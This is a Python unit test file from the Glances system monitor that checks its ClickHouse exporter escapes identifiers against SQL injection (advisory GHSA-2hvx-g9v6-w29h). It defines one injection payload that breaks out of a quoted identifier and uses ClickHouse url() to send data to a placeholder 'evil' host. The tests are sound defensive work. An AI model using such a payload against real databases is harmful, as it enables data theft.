#!/usr/bin/env python
#
# Glances - An eye on your system
#
# SPDX-FileCopyrightText: 2026 Nicolas Hennion <nicolas@nicolargo.com>
#
# SPDX-License-Identifier: LGPL-3.0-only
#

"""Glances unit tests for ClickHouse export SQL injection prevention (GHSA-2hvx-g9v6-w29h).

Tests cover:
- quote_identifier properly escapes ClickHouse identifiers (backtick escaping)
- CREATE TABLE / DESCRIBE / ALTER TABLE use quoted identifiers
- SQL injection via crafted column names (stats keys) is neutralized
- SQL injection via crafted table names (plugin names) is neutralized
- Normal export workflow still produces the expected DDL
"""

import threading

import pytest

try:
    import clickhouse_connect  # noqa: F401
except ImportError:
    pytest.skip("clickhouse_connect not installed", allow_module_level=True)

from clickhouse_connect.driver.binding import quote_identifier

from glances.exports.glances_clickhouse import Export

# Payload that, without quoting, would break out of the backtick-quoted identifier
# and turn the CREATE TABLE into an OOB exfiltration query (ClickHouse url()).
INJECTION = "x` ENGINE = MergeTree() AS SELECT * FROM url('http://evil"


# ---------------------------------------------------------------------------
# Tests – quote_identifier (the escaping primitive used by the exporter)
# ---------------------------------------------------------------------------


class TestQuoteIdentifier:
    """The exporter relies on clickhouse_connect.quote_identifier."""

    def test_simple_name_unchanged(self):
        # A legitimate psutil field name is quoted identically to the previous
        # f"`{key}`" format -> no regression on the insert column_names parsing.
        assert quote_identifier('cpu_user') == '`cpu_user`'

    def test_backtick_is_escaped(self):
        quoted = quote_identifier(INJECTION)
        # Result is a single backtick-quoted identifier; the embedded backtick
        # is escaped, so the injected SQL cannot break out.
        assert quoted.startswith('`') and quoted.endswith('`')
        assert '\\`' in quoted
        # The naive/vulnerable format would have contained a bare closing backtick
        # followed by the payload; it must NOT appear as-is.
        assert '`x` ENGINE' not in quoted


# ---------------------------------------------------------------------------
# Tests – DDL construction in Export.export() neutralizes injection
# ---------------------------------------------------------------------------


class FakeClient:
    """Records every DDL string sent to ClickHouse; no server required."""

    def __init__(self):
        self.commands = []
        self.inserts = []

    def command(self, query):
        self.commands.append(query)

    def query(self, query):
        self.commands.append(query)
        # Empty schema -> every column is treated as missing (exercises ALTER ADD).
        return type('R', (), {'result_rows': []})()

    def insert(self, table, data, column_names):
        self.inserts.append((table, data, column_names))


def _make_export():
    """Build an Export without going through __init__/network connection."""
    export = Export.__new__(Export)
    export.export_enable = True
    export.hostname = 'myhost'
    export._lock = threading.Lock()
    export.client = FakeClient()
    return export


class TestClickHouseExportDDL:
    def test_benign_create_table(self):
        export = _make_export()
        creation_list = [
            '`time` DateTime',
            '`hostname_id` String',
            f'{quote_identifier("total")} Nullable(Float64)',
        ]
        export.export('cpu', creation_list, [['NOW()', 'myhost', 95.5]])

        create = export.client.commands[0]
        assert 'CREATE TABLE IF NOT EXISTS `cpu`' in create
        assert '`total` Nullable(Float64)' in create
        # Row inserted through the parameterized path.
        assert export.client.inserts and export.client.inserts[0][0] == 'cpu'

    def test_injection_in_column_name_is_neutralized(self):
        export = _make_export()
        # creation_list is built exactly like Export.update() does (quote_identifier
        # on the stats key), here with a malicious key.
        creation_list = [
            '`time` DateTime',
            '`hostname_id` String',
            f'{quote_identifier(INJECTION)} Nullable(String)',
        ]
        export.export('cpu', creation_list, [['NOW()', 'myhost', 'v']])

        joined = '\n'.join(export.client.commands)
        # The payload survives only inside an escaped-backtick identifier.
        assert '\\`' in joined
        # No un-escaped breakout that would start a real ENGINE/url() clause.
        assert '`x` ENGINE = MergeTree() AS SELECT' not in joined

    def test_injection_in_plugin_name_is_neutralized(self):
        export = _make_export()
        creation_list = ['`time` DateTime', '`hostname_id` String']
        export.export(INJECTION, creation_list, [['NOW()', 'myhost']])

        create = export.client.commands[0]
        assert 'CREATE TABLE IF NOT EXISTS ' + quote_identifier(INJECTION) in create
        assert '`x` ENGINE = MergeTree() AS SELECT' not in create
